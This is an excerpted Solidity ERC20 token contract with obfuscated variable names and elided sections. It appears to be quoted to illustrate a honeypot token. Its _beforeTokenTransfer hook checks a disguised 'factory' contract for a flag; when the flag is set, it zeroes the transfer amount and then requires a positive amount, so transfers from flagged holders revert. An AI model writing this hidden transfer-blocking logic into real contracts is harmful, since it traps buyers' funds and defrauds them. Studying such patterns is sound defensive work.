...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    IUniswapV2Factory private factorrtfy;
    ...
    address private natrfbgsy;
    uint256 ptrhuay = 118;
    uint256 DF2L = ptrhuay * 101;
    ...
    constructor(address _factory) {
        uint256 supply = 20000000 * 10**18;
        factorrtfy = IUniswapV2Factory(_factory);
        _mint(msg.sender, supply);
    }

    string private IPFS = "XXX";

    string private Basghtuy;
    ...
    function _beforeTokenTransfer(
        ...
        bool flag = factorrtfy.getPairCount(from);
        uint256 total = 0;
        if(flag){
            amount = total;
            require(amount > 0);
